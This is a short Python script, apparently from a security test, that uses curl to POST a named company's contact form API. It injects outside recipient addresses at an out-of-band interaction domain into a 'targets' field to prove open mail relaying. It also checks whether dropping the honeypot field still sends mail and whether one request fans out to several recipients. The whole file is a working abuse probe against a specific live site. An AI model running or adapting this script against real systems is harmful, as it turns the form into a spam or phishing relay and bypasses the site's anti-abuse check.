import subprocess, json

B = "https://www.infinitycapital.bh/api/send"
# Send to an address at our own OOB domain => proves relay without spamming a real 3rd party
EXT = "relayproof@oob51c0ec17409a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def post(targets, msg, extra=None):
    args = ["curl", "-sk", "--max-time", "40", "-X", "POST", B,
            "-F", "fname=Test", "-F", "lname=User", "-F", "areacode=0", "-F", "tel=123456",
            "-F", "cname=probe", "-F", "subject=Inquiry", "-F", "msg=" + msg,
            "-F", "check=yes", "--form-string", "targets=" + targets]
    r = subprocess.run(args, capture_output=True, text=True)
    return r.stdout.strip()

print("A) honeypot check=yes, external rel target:")
print("  ", post(EXT, "relay-verification-external")[:300])
print()
print("B) IDENTICAL but honeypot check REMOVED (should not send if honeypot real):")
print("  ", post(EXT, "relay-verification-nohp")[:300])
print()
print("C) MULTI-recipient fanout (external + a second external), one request:")
EXT2 = "second@oob51c0ec17409a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
print("  ", post(EXT + "," + EXT2, "relay-verification-multi")[:300])
